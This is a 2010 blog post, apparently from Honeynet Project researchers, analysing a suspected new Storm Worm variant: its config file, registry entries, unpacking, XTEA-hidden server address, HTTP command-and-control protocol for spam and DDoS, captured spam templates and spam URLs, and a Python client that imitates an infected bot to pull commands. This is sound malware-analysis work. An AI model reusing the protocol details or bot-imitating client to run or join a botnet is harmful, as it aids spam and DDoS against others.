---
title: "A Breeze of Storm"
date: "2010-04-28"
categories: 
  - "encryption"
tags: 
  - "storm-worm"
  - "stormfucker-d69"
---

Today, Steven Adair from Shadowserver imformed us about a new piece of malware that looks like a new version of the infamous Storm Worm. Storm was one of the first serious peer-to-peer botnets, it was sending out spam for more than two years until its decline in late 2008. Mark Schloesser, Tillmann Werner, Georg Wicherski, and I [Stormfucker](http://www.h-online.com/security/news/item/Storm-Worm-botnet-cracked-wide-open-739607.html>did some work on how to take down Storm</a> back then, so the rumors about a new version caught our interest. Mark, Tillmann, and me started to take the sample apart, and it looks very much like Storm indeed. It even uses the same configuration file, stored under C:\WINDOWS\herjek.config (the same filename as used by the last Storm version), but as the command-and-control channel has been replaced with an HTTP based version, there is no peer list included anymmore. When we looked at it, just contained two lines:
<code>
[config]
ID=285220200
</code>
This ID is also stored in the registry under HKLM/SOFTWARE/Microsoft/Windows/ITStorage/Find, together with a mutex name that prevents execution of multiple instances of the malware on one machine.
<div></div>
[image:538 align=center node=538 size=original]
<div></div>
Just like Storm, this new malware decompresses itself into a heap section and jumps to the unpacked code. We just dumped the heap section to a file and fixed the imports to get an executable we can analyze conveniently.
<div></div>
Although this is already pretty good evidence that the two specimens are related, the question remains whether this is really a new Storm version, so let's have a look at the actual functionality. We compared the last version of storm to the new samples. Around 2/3s of the functions in the new sample are simply copy&paste from the last storm code base. Since the source code of storm has never been public, the same team of developers has finally created a new variant or sold it's code.
The original version was rather large, having more than 800 function. A large portion of this was the P2P code. This is missing completely in the new version and the actual command protocol is based on HTTP instead of plain TCP connections. We wonder if they don't rely on P2P anymore because of the attack implemented in <a href=).

The HTTP request looks like this: `POST /aio.jpg HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windoss NT 5.1; SV1) Host: [sanitized] Content-Length: 85 Connection: Keep-Alive Cache-Control: no-cache`

`a=eNozrFNMLC5OLMnMz6tTDM/MS8kvL1aICFAITi0qy0xOVQhITM5WMKpTNLQwMbG0tDQwNQeywcgAAGCpEo0HTTP/1.1 200 OK Server: nginx/0.7.65 Date: Tue, 27 Apr 2010 13:00:30 GMT Content-Type: text/html; charset=windows-1252 Transfer-Encoding: chunked Connection: close X-Powered-By: PHP/5.3.2

``78 AAAAXnheDYo5DsAgDATfwgNY2QaEeQ5HkgaRgtS8PS5Wox1NHXv6TJ5D9hxtQWEKe91dGLv1Z76tTqzrOy4TLISFRj2OjuOSIFEgpIj2hQrUFCs4/dVnGE0= 0`

All parameters and responses are base64 encoded and gzipped. Just like in the original Storm C&C protocol. The IP address of the server is hardcoded in the binary. Well, not really in the code but appended in encrypted form. The encryption is XTEA - the same cryptor used in early versions of Storm's packer.

The new version runs as "asam.exe". So, the authors have changed the executable's filename, but they either didn't look in the source code or were too lazy to change the name of the config file.

One method of command & control is implemented via HTTP requests. While looking at those requests we found another clue that this is actually a spinoff of Storm. The User-Agent is set to "Mozilla/4.0 (compatible; MSIE 6.0; Windoss NT 5.1; SV1)" which includes the (intended?) typo "Windoss" instead of "Windows" (this has already been mentioned by Steven, also). The requested path on the server consists of three random letters concatenated with a random choice from gif, jpg, htm extensions.

Also notable is the use of nginx as the web server as revealed by "Server: nginx/0.7.65" in the response. This is probably then relaying the request to upper tier servers in the C&C structure.

The actual command protocol is identical to the original Storm protocol. It consists of a handshake with two phases.

Stage 1 looks the following: `Postdata: 1~!VM1~!Windows XP Service Pack 3~!82647280~!1~!1~!0 ---- START Response data ---- secretserver.internet.ru~!1.2.3.4~!0~!195.242.208.40~!209.85.218.15`

Sent is the command "1", the machine name, operating system version, and an ID which identifies the machine in the further communication. It's like a session key used in HTTP application. The reponse is a reverse lookup of the public IP address of the host, the public IP itself, and other servers, like a Google MX.

Stage 2 looks the following:

`Postdata: 2~!82647280~!1~!0~!0 ---- START Response data ----`

Many people thought that this stage is useless. Actually, we found an "update" command in this stage of the handshake, which we used in our "Stormfucker", two years ago.

After this initial handshake, different requests for Spam (command 3) and DDoS attacks (command 6) are sent to the server.

The request for DDoS target is shown in the following. The response is empty (IP address: 0.0.0.0). In case of active DDoS targets, the IP address can be seen here.

`Postdata: 6~!82647280~!1~!0 ---- START Response data ---- 0.0.0.0:0;0.0.0.0:0;1;1 0.0.0.0:0;0.0.0.0:0;2;1`

The spam part looks the following. The client sends the spam-request command and the server returns the spam-templates, including faked mail server versions, subjects, receipients, target-domains, ...

`Postdata: 3~!82647280~!1~!~! ---- START Response data ---- 5~!1272366542~!Date: %^D^% From: "%^C2%^Fnames^%^%" <%^V2^%@%^C1%^Fdomains^%^%> MIME-Version: 1.0 To: %^0^% Subject: %^Fpharma2^% Content-Type: text/plain; charset=%^Fcharset^% Content-Transfer-Encoding: 7bit Message-ID: <%^Z^%.%^R1-9^%0%^R0-9^%0%^R0-9^%0%^R0-9^%@%^V1^%>`

`%^Forder.txt^% %^Frxmeds.txt^% online today! %^Fbrowse.txt^% our web site today -> %^Frxdomains2.txt^%

``~!~!eximver~!1269613000~!4.04 4.05 ... ~!domains_old~!1271522172~!007-jamesbond.com 3rivers.net 800loadcel.com ... zzum.ro ~!datingURLOLD~!1271796799~!http://12n3.com/2414 http://12n3.com/2415 ... http://vilasta.com/?yMzZuoUt ... http://wapurl.co.uk/?YCLUEZM ~!shemaleBabe~!1272144785~!babes sexy cute hot nice ~!pharma2~!1272305961~!Disappointed with your bad performance in bed? Step up your performance in bed! for the best performance in bed.. ... Want great sex? Get.. ~!datingURLNew~!1272148944~!http://www.odun.net/78774 http://yiyd.com/457991/ ... http://fytopavenukyz.my`

Mark took some time to write a command fetcher and decoder. Have fun with it :) `#!/usr/bin/env python`

`import os, sys, urllib, urllib2, string, random, base64, zlib, datetime

extensions = ['.gif', '.jpg', '.htm']

def make_url(url): return url + ''.join([random.choice(string.lowercase) for i in range(3)]) + random.choice(extensions)

def get_url(turl, pdata): req = urllib2.Request(turl, urllib.urlencode(pdata)) req.add_header('Content-Type', 'application/x-www-form-urlencoded') req.add_header('Cache-Control', 'no-cache') req.add_header('User-Agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windoss NT 5.1; SV1)') r = urllib2.urlopen(req) c = r.read() return c

def decode(raw): a = base64.b64decode(raw) b = zlib.decompress(a[a.find('x'):]) return b

def fetch(url, cmd): pdata = [('a', base64.b64encode(zlib.compress(cmd)).replace('=','') ),] furl = make_url(url) print ' Fetching', furl c = get_url(furl, pdata) print ' -> got', len(c), 'bytes' return c

def randomstr(length): return ''.join([random.choice(string.letters) for i in range(length)])

def randomdigits(length): return ''.join([random.choice(string.digits) for i in range(length)])

if __name__ == '__main__': from optparse import OptionError from optparse import OptionParser

version = """-------------------------- HTTP Command client for Storm worm 2 (supposedly) Version 1, by Honeynet Project --------------------------""" usage = '%s [-t target]' % sys.argv[0] parser = OptionParser(version=version, usage=usage)

parser.add_option('-t', dest='target', help='hostname/ip') (options, args) = parser.parse_args()

if not options.target: parser.print_help() sys.exit(1)

url = 'http://{0}/'.format(options.target)

seqnr = randomdigits(8) requests = [ '1~!{0}~!Windows XP Service Pack 3~!{1}~!1~!1~!0'.format(randomstr(8),seqnr), '2~!{0}~!1~!0~!0'.format(seqnr), '6~!{0}~!1~!0'.format(seqnr), '3~!{0}~!1~!~!'.format(seqnr), ]

print version print 'Using C&C URL', url

now = datetime.datetime.now() print 'Storing results in directory', str(now)

for r in requests: cmd = r[0] raw = fetch(url, r) dec = decode(raw) if not os.path.exists(str(now)): os.mkdir(str(now)) fpath = os.path.join(str(now), 'cmd_' + cmd + '.txt') fd = open(fpath, 'w') print >>fd, 'Requesting cmd {0} on {1}:'.format(cmd, url) print >>fd, 'Postdata:', r print >>fd, '---- START Response data ----' fd.write(dec) fd.close()

``print '-> Done.' sys.exit(0)`
